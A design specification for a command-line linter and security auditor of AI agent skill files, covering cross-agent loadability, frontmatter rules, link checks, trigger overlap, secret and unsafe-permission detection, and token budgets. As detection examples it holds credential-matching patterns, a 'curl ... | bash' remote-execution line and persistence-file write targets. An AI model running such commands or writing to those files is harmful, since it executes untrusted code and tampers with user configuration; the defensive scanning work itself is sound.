# How `the skills lint` and `the skills audit` Check Skill Quality

`thepia` is built for authors who maintain and refine their own AI abilities in `~/.agents/skills`,
`~/.claude/skills`, and project repositories. Unlike third-party registry installers, `the` focuses on
making self-authored skills load reliably across every installed coding assistant, trigger accurately
without colliding with sibling skills, keep their referenced scripts and docs intact, stay within
context-window budgets, and remain free of leaked secrets or unsafe instructions.

This document specifies how `the skills` checks quality today, the value proposition and
implementation design for the native checks in `the skills lint`, the two-layer security model
(`the skills lint` smoke test plus `the skills audit` delegating to `LichAmnesia/skill-lint`), and
the token-budgeting roadmap (initial delegation to `@haasstefan/skills-lint` with an outlook to
replace it using bundled small-model tokenizers).

---

## 1. Diagnostic Architecture and Stream Discipline

Quality checking in `thepia` separates **what breaks an agent** from **what degrades quality or portability**, and keeps machine-readable output streams clean:

1. **Agent-Breaking Warnings (`skill-skipped`, `skill-conflict`):**
   - Emitted when a real coding agent (`claude`, `gemini`, `opencode`, `goose`) will reject the
     skill outright or load it nondeterministically.
2. **Quality and Conformance Diagnostics (`skill-lint`; asset codes such as `broken-link`; security codes such as `exposed-secret`; projected `skill-trigger` and `skill-tokens`):**
   - Emitted when a skill loads in at least one agent but violates the published
     [Agent Skills (`agentskills.io`)](https://agentskills.io) format, has weak or colliding trigger
     descriptions, points to missing local files, exceeds context budgets, or trips a security smoke
     check.
3. **Stream Separation (`stdout` vs. `stderr`):**
   - `stdout` carries the structured `Report` (human table/summary or `--format json` document).
   - `stderr` carries `rustc`-styled [`Diagnostic`](../crates/the/src/diag.rs) entries (`error`,
     `warning`, `note`), each with a stable kebab-case `code`, offending file `context`, `cause`,
     and actionable `help` fix instructions.

---

## 2. Native Checks in `the skills lint`: USP and Implementation

Every native check in `the` runs in-process in Rust on top of [`yaml-rust2`](../crates/the/src/skills/parse.rs)
and `std::fs`, completing in milliseconds with zero network calls and zero external runtime
dependencies.

### Check 1: Cross-Agent Loadability and Precedence Verification (Implemented)

- **User Value Proposition (USP):**
  A skill authored and tested in Claude Code often disappears silently when you switch to OpenCode,
  Goose, or Gemini CLI. Claude Code is forgiving: it loads `SKILL.md` files that have no YAML
  frontmatter, invalid YAML (such as an unquoted `: ` in a plain scalar), or no `name` field
  (defaulting to the folder name). OpenCode, Goose, and Gemini CLI reject those same files. Worse,
  if you keep a skill in both `~/.claude/skills` and `~/.agents/skills` without symlinking, Claude
  Code and Goose shadow one copy while OpenCode parses roots concurrently and picks a winner at
  random on every launch. `the` is the only tool that models each agent's exact discovery walk and
  loader rules (`loaded`, `shadowed`, `conflict`, `skipped`) so you know before launching an agent
  whether your skill will actually load.
- **How It Works ([`parse.rs`](../crates/the/src/skills/parse.rs), [`resolve.rs`](../crates/the/src/skills/resolve.rs)):**
  - Classifies frontmatter failures with exact 1-based `SKILL.md` line and column numbers
    (`no-frontmatter`, `frontmatter-unterminated`, `frontmatter-invalid`).
  - Evaluates per-agent loader rules in `loads()`:
    - `name-missing`: `name` absent, empty (for Gemini/Goose), or non-string (`opencode`, `goose`, `gemini` skip).
    - `name-has-slash`: `name` contains `/` (`goose` skips).
    - `description-missing`: `description` absent or whitespace-only (`gemini` skips).
    - `description-not-string`: `description` is a number, boolean, or list (`opencode` skips).
  - Resolves canonical paths across symlinks so a shared skill is reported once with all reached
    locations, while distinct files with the same `name` are flagged as `shadowed` (`claude`,
    `goose`) or `skill-conflict` (`opencode`).
- **Claude Code identity is the directory name (verified 2026-11-13, see
  [skills-search.md](skills-search.md#verified-behavior); implemented):**
  - Claude Code identifies a personal or project skill by its **directory name**. The frontmatter
    `name` sets the `/` command unless another skill already claims it. `loads()` returns the
    directory name for Claude Code, so two skills that share only a frontmatter `name` are both
    `loaded`, as in the real agent, instead of one being reported `shadowed`.
  - **`claude-alias-collision` (warning, implemented):** when several skills loaded by Claude Code
    claim the same frontmatter `name`, `/<name>` invokes only one of them. One warning per shared
    name lists every file and tells the author to give each a unique `name` (or drop it).
  - `name-mismatch` now says that Claude Code lists the skill under its directory name and that
    `/<name>` works only if no other skill claims it.
  - In a plugin, the frontmatter `name` overrides the directory name (per the claude-skill-lint spec;
    not verified). This only matters once plugins are imitated (see Not yet covered).

### Check 2: Agent Skills (`agentskills.io`) Spec and Extended Frontmatter Lint (Implemented + Projected)

- **User Value Proposition (USP):**
  Self-authored skills frequently accumulate ad-hoc frontmatter keys, uppercase or underscored
  names, or folder renames that leave `name:` out of sync with the directory name. While a lenient
  local loader may tolerate this today, strict validators (`skills-ref`, plugin bundlers, and
  team CI gates) reject them. Existing npm linters either miss these checks or introduce false
  positives (for example, failing when `description:` appears before `name:` inside a comment, or
  rejecting valid digit-leading skill names). `the` validates the full specification accurately on
  the parsed YAML AST.
- **How It Works:**
  - **Implemented in [`parse.rs`](../crates/the/src/skills/parse.rs):**
    - `name-format`: `name` must be 1 to 64 characters of ASCII lowercase letters, digits, and
      single hyphens (`^[a-z0-9]+(-[a-z0-9]+)*$`), not starting or ending with `-` and without `--`.
    - `name-mismatch`: `name` must match the parent directory name.
    - `description-missing` and `description-too-long`: `description` must be 1 to 1024 characters.
  - **Implemented since:** `compatibility-invalid`, `metadata-not-map`, `license-not-string`,
    `allowed-tools-invalid`, and `unknown-frontmatter-key`.
  - **The `name` length limit is an `agentskills.io` rule, not a Claude Code one.** Claude Code's
    docs state no maximum, and the claude-skill-lint spec deliberately refuses to invent one
    (SR-104). Keep the 64 in the spec tier, and cite `agentskills.io` in the message.
  - **Known-keys list (fixed 2026-11-13).** `AGENT_EXTENSION_KEYS` in `parse.rs` now holds Claude
    Code's full documented frontmatter reference (20 fields, code.claude.com/docs/en/skills),
    adding `effort`, `arguments`, `disallowed-tools`, `background`, `paths` and `shell`, which
    `unknown-frontmatter-key` used to report on valid skills. The list carries the date and source
    it was checked against; re-check it when Claude Code adds fields.
  - **Default mode vs `--portable` mode** (adopted from the claude-skill-lint spec, SCN-005):
    - Default: `unknown-frontmatter-key` fires only for keys no supported agent recognizes. Known
      agent extensions are valid where the author uses them, so the default run stays silent about
      them.
    - `the skills lint --portable`: additionally flags every key outside the portable
      `agentskills.io` set (`name`, `description`, `license`, `compatibility`, `metadata`,
      `allowed-tools`) as `non-portable-field`, naming which agents honor the key and which ignore
      it. In this mode the user asked for portability, so these are warnings, not notes.
  - **Projected `description-budget` (warning):** Claude Code truncates `description` plus
    `when_to_use` at 1,536 characters combined in the skill listing it shows the model (the
    `skillListingMaxDescChars` setting changes the cap). This is separate from the `agentskills.io`
    1,024-character `description` limit; report both, and say which is which.
  - **Boolean fields accept YAML 1.1 forms.** Claude Code accepts `true`/`false`/`yes`/`no`/
    `on`/`off`/`1`/`0`, case-insensitive, for `disable-model-invocation`, `user-invocable` and
    `background` (per the claude-skill-lint spec, "v2.1.218+", not verified). `yaml-rust2` parses
    YAML 1.2, where `off` is the *string* "off", so any type check on these fields must accept
    those strings.
  - **`allowed-tools` parsing:**
    - Claude Code accepts a list (`[Read, Grep]`) and a space- or comma-separated string, so no form
      is an error. A form other agents ignore is a `non-portable-field` in `--portable` mode only.
    - Tokenizing must not split inside a `Tool(...)` pattern: `"Bash(git status:*) Read"` is two
      grants, not three. Implemented as `parse::allowed_tools()`, which splits on spaces and commas
      outside parentheses only; `unrestricted-bash` (Check 5) uses it, and the projected script
      targets in Check 3 will too. (`allowed-tools-invalid` only checks the value's type.)
  - **Rejected: value enums and a tool-name registry.** Validating `effort` or `model` values, or
    tool names against a built-in list, goes stale with every agent release. Every correctness
    fix in the claude-skill-lint spec (SR-001 to SR-005: `xhigh`, `model: inherit`, full model
    IDs, retired tool names) was this kind of drift. `the` does not check these values.

### Check 3: Fence-Aware Local Link and Bundled Asset Integrity (Implemented + Projected)

- **User Value Proposition (USP):**
  Progressive disclosure only works if the files a skill points to actually exist. When you refactor
  a skill, rename a helper script in `scripts/`, or move a deep-dive doc in `references/`, a broken
  relative link in `SKILL.md` is completely invisible at startup because agents only read frontmatter
  until the skill is triggered. Weeks later, when an agent activates the skill mid-task and tries to
  read `[schema.md](references/schema.md)` or execute `./scripts/verify.sh`, the file-read fails and
  the agent wastes turns guessing or hallucinating. `the skills lint` catches every broken local
  reference on disk while ignoring placeholder links inside fenced code examples.
- **How It Works:**
  - Scans `SKILL.md` (and any `references/*.md` files inside the skill directory) with a fence state
    machine that tracks opening and closing ```` ``` ```` and `~~~` blocks so code examples are skipped.
  - Extracts Markdown links `[label](target)` and `@[label](target)` includes outside code fences.
  - **Implemented in [`links.rs`](../crates/the/src/skills/links.rs) (`local_path`), applied before
    resolving:**
    - `${CLAUDE_SKILL_DIR}` expands to the skill directory, so `${CLAUDE_SKILL_DIR}/scripts/x.py` is
      checked like `scripts/x.py`, including the escape check.
    - `${CLAUDE_PROJECT_DIR}` targets are skipped: the project is whichever one the session runs in,
      so they cannot be resolved from the skill and are never reported.
    - A target still holding `{`, `}` or `$` is a template or an unknown variable (`{{name}}.md`,
      `$HOME/x.md`) and is skipped.
    - A `<...>` destination is CommonMark's form for a path with spaces, so `<my file.md>` is
      checked; only a bare word with no `/` or `.` (`<template>`, `<name>`) is a placeholder.
  - Ignores external URIs (`http://`, `https://`, `mailto:`, `customization://`, `conversation://`)
    and pure anchors (`#section`).
  - Resolves non-Markdown targets (`.py`, `.sh`, `.json`, assets) as well as `.md` files.
  - Checks that a script named in an `allowed-tools` grant exists, e.g.
    `Bash(${CLAUDE_SKILL_DIR}/scripts/x.sh *)`, using the shared tokenizer from Check 2.
  - Bare paths mentioned in prose but not linked (`see references/guide.txt`) are deferred, or
    notes at most: detecting them is where false positives come from.
  - The scanner is hand-written, not regex-based, so it runs in linear time on adversarial input.
  - Strips `#fragment` and `?query` suffixes, resolves the relative path against the containing file's
    directory, and verifies three things:
    1. `link-target-missing`: the target file or directory exists on disk.
    2. `link-escapes-skill`: warns if a relative link traverses outside the skill directory (or repository
       root) via `..`, which breaks if the skill is symlinked or copied to `~/.agents/skills`.
    3. `script-not-executable`: if a link or command reference points to `scripts/<file>.sh` or
       `scripts/<file>.py` without an interpreter prefix, notes when the script lacks the executable
       bit (`chmod +x`) on Unix.

### Check 4: Trigger Specificity and Pairwise Semantic Overlap (Projected Native)

- **User Value Proposition (USP):**
  In a personal `~/.agents/skills` collection of 15 to 50 skills, the hardest failure mode to debug
  is **routing failure**: either the agent never activates your skill because the description only
  states *what* it is rather than *when* to use it, or two related skills have such similar
  descriptions that the model picks between them at random. Third-party tools like
  `@elonmust1/skillcheck` pioneered static trigger heuristics and Jaccard overlap checks, but their
  regex YAML parser breaks on standard multiline YAML blocks (`description: >-`). `the` runs these
  checks directly on the parsed `yaml-rust2` string, giving instant feedback on whether a skill's
  description is specific enough to fire and distinct enough from its neighbors.
- **How It Works:**
  - **Per-Skill Trigger Quality (`skill-trigger`):**
    - `description-too-short`: warns when `description` is under 40 characters (too thin for reliable
      routing).
    - `trigger-missing-cue`: checks for explicit activation phrasing (`use when`, `use for`,
      `trigger when`, `when the user`, `invoke when`, `activate when`, `do not use for`).
    - `trigger-generic-opener`: flags descriptions that waste their opening words on low-signal
      boilerplate (`"A skill for..."`, `"This skill helps..."`, `"Use this skill to assist..."`).
    - `trigger-low-specificity`: tokenizes `description` into lowercase domain terms (`len > 2`),
      strips standard English and skill-meta stopwords (`skill`, `use`, `using`, `help`, `assist`,
      `task`, `user`, `agent`, `when`, `how`, etc.), and warns if fewer than **4 distinctive
      tokens** remain.
  - **Cross-Skill Description Overlap (`skill-overlap`):**
    - For all loaded skills active in the same agent scope, computes pairwise **Jaccard similarity**
      $|T_a \cap T_b| / |T_a \cup T_b|$ over their distinctive token sets (plus exact duplicate
      description detection).
    - Emits a warning when Jaccard similarity is $\ge 0.45$ ($45\%$), listing the overlapping keywords
      shared by both skills and advising the author to add negative triggers (`"Do not use for..."`)
      or sharpen the boundary between the two skills.

### Check 5: Zero-Latency Security Smoke Test in Regular Linting (Projected Native)

- **User Value Proposition (USP):**
  Even when you author your own skills, it is easy to accidentally paste a live API key or token from
  a terminal session into an example block, copy text from a web page containing invisible zero-width
  or bidirectional Unicode control characters that confuse tokenizers, or leave `--dangerously-skip-permissions`
  or `allowed-tools: Bash(*)` in a skill copied from a scratchpad. Running a full external security
  scanner on every `the skills list` or `the skills lint` invocation would be too slow, so `the`
  includes a zero-latency, in-process smoke test that catches high-risk accidents immediately.
- **How It Works ([`smoke.rs`](../crates/the/src/skills/smoke.rs)):**
  - Runs in-memory over `SKILL.md` (and bundled text files when `the skills lint` runs) with zero
    subprocesses:
    1. `exposed-secret` (implemented, **error**): high-confidence hardcoded credential literals
       (`sk-ant-...`, `sk-...`, `AKIA[0-9A-Z]{16}`, `ghp_[A-Za-z0-9]{20,}`, `xox[baprs]-...`, and
       `-----BEGIN [A-Z ]*PRIVATE KEY-----`).
    2. `trojan-source` (implemented, **error**): zero-width and bidirectional override characters
       (`\u200B`..`\u200F`, `\u202A`..`\u202E`, `\u2060`..`\u206F`, excluding a leading file BOM
       `\uFEFF` which `parse.rs` already strips cleanly).
    3. `symlink-escape` (implemented, **error**): a symlink inside the skill resolving outside it.
    4. `unrestricted-bash` (implemented, warning): grants that allow any shell command: a bare
       `Bash` (no pattern pre-approves every command), `Bash(*)`, and any argument to `sh`/`bash`
       in either the `:*` or the space form (`Bash(sh:*)`, `Bash(bash *)`).
       Projected: also `Write(*)` and `--dangerously-skip-permissions` in instructions. Uses the
       shared `allowed-tools` tokenizer (Check 2).
    5. `overbroad-trigger` (projected, warning): descriptions claiming universal activation (`"on
       every message"`, `"whenever the user asks anything"`, `"always activate"`).
  - Each finding is emitted under its own code with the file and line, and suggests running
    `the skills audit` for a full deep scan.
  - **The three errors are a deliberate exception to INV-1** (see Conformance): those skills do
    load in Claude Code, but a leaked secret, a hidden-character attack or an escaping symlink is
    a safety failure, not a style problem.

---

## 3. Plan: Deep Security Scanning via `the skills audit` (`LichAmnesia/skill-lint`)

While `the`'s native smoke test catches common self-authoring accidents in microseconds, deep
supply-chain and toxic-flow analysis (multi-hop shell variable taint tracking, obfuscated base64
command substitutions, provider-host secret exfiltration matching, and OWASP Agentic Security Top 10
`AST01`..`AST04` rules) is a specialized, signature-heavy domain. Rather than duplicating 10 rule
modules in Rust, `the skills audit` delegates deep scanning to **`LichAmnesia/skill-lint`**
(`skill-lint@0.2.0` on npm) and translates its output into `the`'s native report and diagnostic
format.

### Why `LichAmnesia/skill-lint` Is the Right Delegate
Code inspection of `skill-lint@0.2.0` confirmed several high-signal design choices:
- **Role-Aware File Classification (`classify.js`):** Distinguishes `skill` (`SKILL.md`),
  `skill-script`, `skill-doc`, `readme`, `doc`, and `repo-infra`. It scans full prose in `SKILL.md`
  (because agents execute prose instructions) while scanning only fenced code blocks in `README.md`
  and `docs/` with automatic severity downgrading.
- **Shell Line-Continuation Normalization:** Collapses `\<LF>` before regex evaluation so multi-line
  `curl ... | bash` pipelines cannot evade detection.
- **Provider-Host Secret Allowlisting (`R04`):** When a helper script reads `ANTHROPIC_API_KEY` or
  `GITHUB_TOKEN` and makes HTTP calls, it checks all URLs in the file against canonical provider
  hosts (`api.anthropic.com`, `api.github.com`) and only flags `CRITICAL` exfiltration if the file
  contacts an off-provider host or shells out dynamically.
- **3-Hop Variable Taint Tracking (`R07`):** Tracks variable assignments across 3 hops (e.g.
  `A=~; B=$A/.claude/CLAUDE.md; echo x >> $B`) to detect indirect persistence writes to
  `~/.claude/CLAUDE.md`, `~/.claude/settings.json`, `~/.claude/hooks`, `MEMORY.md`, `SOUL.md`, shell
  RC files, and `.ssh/authorized_keys`.

### CLI Surface: `the skills audit`

```text
the skills audit [<NAME>] [--scope <project|user|system|dir>] [--agent <claude|gemini|opencode|goose>] [--dir <PATH>] [--runner <auto|local|npx>] [--format <human|json>]
```

- With no `<NAME>`, audits every distinct skill directory discovered by `the`'s catalog (or filtered
  by `--scope` / `--agent` / `--dir`).
- With `<NAME>`, resolves the skill through `the`'s catalog and audits its resolved directory.

### Runner Resolution Order
1. `--runner local` (or `auto` first check): look for `skill-lint` on `PATH` and verify it is
   `LichAmnesia/skill-lint` (supports `--json`).
2. `--runner npx` (or `auto` fallback): invoke `npx --yes skill-lint@0.2.0 <skill_dir> --json`.
3. If neither `skill-lint` nor `npx` is available on `PATH`, emit an actionable
   `error[audit-runner-missing]` diagnostic explaining how to install `skill-lint` (`npm install -g skill-lint@0.2.0`)
   while still running `the`'s native smoke checks (Check 5) as a fallback.

### JSON Ingestion and Diagnostic Mapping
`skill-lint <dir> --json` emits `schemaVersion: 1` JSON on `stdout`:
```json
{
  "tool": "skill-lint",
  "schemaVersion": 1,
  "origin": "/path/to/skill",
  "findings": [
    {
      "ruleId": "R03",
      "ast": "AST01",
      "severity": "CRITICAL",
      "title": "Dangerous shell invocation",
      "file": "SKILL.md",
      "role": "skill",
      "evidence": "curl -sSL https://example.com/install.sh | bash",
      "message": "curl | sh - remote code execution"
    }
  ],
  "verdict": { "label": "TOXIC", "score": 10, "exitCode": 2 }
}
```

`the skills audit` maps this response into `the`'s architecture:
- **`stdout` (`Report`):**
  - Human table columns: `NAME`, `SCOPE`, `VERDICT` (`SAFE` in `Tone::Ok`, `WARN` in `Tone::Warn`,
    `TOXIC` in `Tone::Fail`), `SCORE`, `FINDINGS` (count by severity), `PATH`.
  - `--format json`: embeds the full `findings`, `verdict`, and `provenance` per skill.
- **`stderr` (`Diagnostic`):**
  - `CRITICAL` and `HIGH` findings emit `Diagnostic::error("skill-audit", ...)` or
    `Diagnostic::warning("skill-audit", ...)` with `code` enriched by the rule and OWASP AST ID
    (e.g. `R03/AST01`), `context` set to `<skill_dir>/<file>`, `cause` set to `message`, and
    `help` showing the `evidence` snippet.
- **Exit Code:**
  - `0` when all audited skills have verdict `SAFE` (or `WARN` without `--strict`).
  - `1` (`Exit::Generic`) when any skill has verdict `TOXIC` (or `WARN` under `--strict`).

---

## 4. Plan: Token Budgeting (`@haasstefan/skills-lint` Delegation to Bundled Model Replacement)

Skills rely on progressive disclosure: frontmatter (`name` + `description`) is injected into the
system prompt of every session, `SKILL.md` body is loaded into context when the skill triggers, and
`references/*` files are loaded only when the agent explicitly reads them. If any of those three
layers is oversized, it crowds out working memory.

Unlike `skill-check` (which approximates tokens via `text.split(/\s+/)` word count and severely
undercounts code blocks, JSON, and URLs), `the` will enforce real token budgets in two phases.

### Phase 1: Native Fast Heuristics + Optional Delegation to `@haasstefan/skills-lint`

1. **Always-On Native Line/Byte Check in `the skills lint`:**
   - Without spawning any subprocess, `the skills lint` checks `SKILL.md` body line count (default
     warning at $> 500$ lines, matching the `agentskills.io` progressive-disclosure guideline) and
     byte size (warning at $> 20\text{ KB}$), advising the author to move reference tables or long
     examples into `references/*.md`.
2. **Delegated Exact BPE Token Check (`the skills lint --tokens`):**
   - When `--tokens` is passed (or configured), `the` delegates exact BPE tokenization (`o200k_base`
     and `cl100k_base`) to **`@haasstefan/skills-lint`** (`v0.1.2`, which ships prebuilt native
     binaries for `darwin-arm64`, `darwin-x64`, `linux-arm64`, `linux-x64`, `win32`).
   - **Invocation:**
     - Resolves `skills-lint` binary from `@haasstefan/skills-lint` (or runs
       `npx --yes @haasstefan/skills-lint --quiet --file <SKILL.md>`).
     - If the workspace does not have a `.skills-lint.config.json`, `the` writes an ephemeral config
       in a temp directory with sensible defaults (`warning: 4000`, `error: 8000` tokens on
       `o200k_base`) and passes `--config <tmp>/config.json`.
   - **Exit Code & Output Mapping:**
     - `@haasstefan/skills-lint` exits `0` (all passed), `1` (exceeds error threshold), `2` (exceeds
       warning threshold), or `3` (config/runtime error).
     - `the` captures its output and translates threshold breaches into `warning[skill-tokens]` or
       `error[skill-tokens]` diagnostics on `stderr`, and adds a `TOKENS` column to the `Report`.

### Phase 2: Outlook to Replace via Bundled Small Models and Native Tokenizers

As `the` introduces bundled local small models to power offline skill refinement, the external
`@haasstefan/skills-lint` delegation will be replaced by an in-process Rust implementation that goes
beyond what `@haasstefan/skills-lint` can do:

1. **In-Process Tokenizer (Zero External Binary):**
   - Bundling a small local model in `the` already brings a native Rust tokenizer crate (such as
     `tokenizers` / `tiktoken-rs` or the bundled GGUF vocabulary) into the binary.
   - `the` will compute exact token counts natively in Rust with content-SHA256 caching, removing
     the Node/`npx` requirement and the `.skills-lint-cache/` directory clutter in user repos.
2. **Three-Tier Progressive Disclosure Budget (Instead of Whole-File Counting):**
   `@haasstefan/skills-lint` only counts tokens for an entire markdown file at once. `the`'s native
   replacement will budget the three progressive-disclosure tiers separately:
   - **Tier 1: Always-On Catalog Cost (`name` + `description` frontmatter):**
     Warn if a single skill's frontmatter exceeds ~150 tokens, and report the **aggregate always-on
     token footprint** across all skills loaded by each agent (e.g. "38 skills loaded by Claude Code
     consume 3,420 always-on system prompt tokens").
   - **Tier 2: On-Trigger Body Cost (`SKILL.md` body):**
     Warn at 2,500 tokens and error at 5,000 tokens, identifying which specific `## Section` headings
     account for the largest share of tokens so the author knows exactly which section to extract
     into `references/`.
   - **Tier 3: On-Demand Reference Cost (`references/*.md`):**
     Report token counts for each linked reference file so authors can see the full cost of following
     a reference link.
3. **Small-Model Semantic Quality & Trigger Verification:**
   - Using the bundled small model, `the skills lint` will upgrade its static Jaccard overlap and
     trigger checks to compute **embedding cosine similarity** between skill descriptions and run an
     offline **synthetic trigger discrimination check** (verifying that positive/negative test
     queries route to the intended skill without spending cloud API quota).

---

## 5. Conformance: No False-Positive Errors

Adopted from the [claude-skill-lint specification](https://github.com/shinytoyrobots/claude-skills-linter/blob/main/spec/spec.md)
(v0.4.0), whose ordering principle is that the worst linter bug is a false positive on working code.

- **INV-1:** in the default mode, no skill that the agents it targets load as valid is reported as
  an `error`. Loader problems are `warning`s per agent (`skill-skipped`), format deviations are
  `note`s (`skill-lint`), and portability is opt-in (`--portable`). The only exceptions are the
  security errors of Check 5.
- **INV-2:** `the skills lint` stays deterministic and offline: no network, no model, the same
  output for the same input. `the skills audit` and `--tokens` delegation are separate, opt-in
  paths.
- **Real-repo baseline:** run `the skills lint` against a public skills repository (the
  claude-skill-lint project uses Anthropic's skills repo) and record the finding counts per code.
  A change in the counts must be intentional and re-recorded with the change that caused it.
- **False-positive holdouts:** a fixture set of skills that load fine in Claude Code but are
  written in awkward forms (`disable-model-invocation: off`, `allowed-tools:
  "Bash(git status:*) Read"`, `description: >-` blocks, digit-leading names,
  `${CLAUDE_SKILL_DIR}` links, 2026-only frontmatter keys), each asserted to produce no `error`.
  This turns INV-1 into a test and sits next to the `eval-resolution.py` harness.
- **Verify agent claims against real sessions.** The claude-skill-lint spec is a secondary source
  for Claude Code behavior. Where `the` depends on one of its claims, check it with a real session,
  as was done for directory-name identity.

### Not yet covered: plugin skills

Once `the` imitates plugins (see [skills-search.md](skills-search.md#not-imitated-yet)), apply the
claude-skill-lint spec's plugin rules (SCN-006): a root-level `SKILL.md` next to
`.claude-plugin/plugin.json` is a single-skill plugin; `.claude-plugin/` may contain only
`plugin.json` and `marketplace.json`; and inside a plugin the frontmatter `name` overrides the
directory name. This also covers sharing a workspace's skills with its repositories through a
local plugin marketplace.

---

## 6. Summary Matrix of `the skills` Quality Checks

| Check Code | Category | Execution Mode | Severity | What It Catches |
|---|---|---|---|---|
| `skill-skipped` | Agent Loadability | Native (`parse.rs`) | `warning` | Missing/invalid YAML, missing `name`, `/` in `name`, missing/non-string `description` that cause an installed agent to skip the skill |
| `skill-conflict` | Agent Precedence | Native (`resolve.rs`) | `warning` | Duplicate skill names across roots where OpenCode's concurrent loader picks a winner nondeterministically |
| `claude-alias-collision` | Agent Precedence | Native (`resolve.rs`) | `warning` | Two skills loaded by Claude Code share a frontmatter `name`, so `/<name>` invokes only one (identity is the directory name) |
| `skill-lint` | Spec Conformance | Native (`parse.rs`) | `note` | `agentskills.io` deviations: `name` format/length, folder mismatch, `description` > 1024 chars, `compatibility` > 500 chars, non-string `metadata`, keys no agent recognizes |
| `description-budget` | Listing Budget | Native (Projected) | `warning` | `description` + `when_to_use` over Claude Code's 1,536-character listing cap |
| `non-portable-field` | Portability (`--portable` only) | Native (Projected) | `warning` | Frontmatter keys outside the portable `agentskills.io` set, with which agents honor them |
| `broken-link`, `link-escapes-skill`, `broken-symlink` | Asset Integrity | Native (`links.rs`) | `warning` | Broken relative links in `SKILL.md` (outside code fences) to `scripts/*`, `references/*`, or sibling files; links escaping the skill root; `${CLAUDE_SKILL_DIR}` expanded, `${CLAUDE_PROJECT_DIR}` and template placeholders skipped. Projected: non-`.md` targets as a tested feature, `allowed-tools` script targets |
| `skill-trigger` | Trigger Quality | Native (Projected) | `note` / `warning` | Missing trigger cue (`"Use when..."`), generic filler opener, or $< 4$ distinctive non-stopword tokens |
| `skill-overlap` | Routing Collision | Native (Projected) | `warning` | Pairwise Jaccard token overlap $\ge 45\%$ (or high embedding similarity with bundled model) between two skills in the same agent scope |
| `exposed-secret`, `trojan-source`, `symlink-escape` | Security Smoke | Native (`smoke.rs`) | `error` | Hardcoded API keys/private keys, hidden zero-width/bidi Unicode characters, symlinks escaping the skill (the INV-1 exception) |
| `unrestricted-bash` | Security Smoke | Native (`smoke.rs`) | `warning` | Bare `Bash`, `Bash(*)`, `Bash(sh:*)`/`Bash(sh *)` and the `bash` forms; projected: `Write(*)`, `--dangerously-skip-permissions`, and `overbroad-trigger` for universal-activation descriptions |
| `skill-tokens` | Context Budget | Native lines + `@haasstefan/skills-lint` $\rightarrow$ Bundled Tokenizer | `note` / `warning` | Oversized `SKILL.md` bodies ($> 500$ lines or token threshold), per-section token breakdown, and aggregate always-on catalog token cost |
| `skill-audit` | Deep Security (`the skills audit`) | Delegated to `LichAmnesia/skill-lint` (`0.2.0`) | `warning` / `error` | Full OWASP `AST01`..`AST04` static analysis (`R01`..`R10`): prompt injection, base64 RCE, `curl \| sh`, credential exfiltration, 3-hop variable taint persistence tampering |
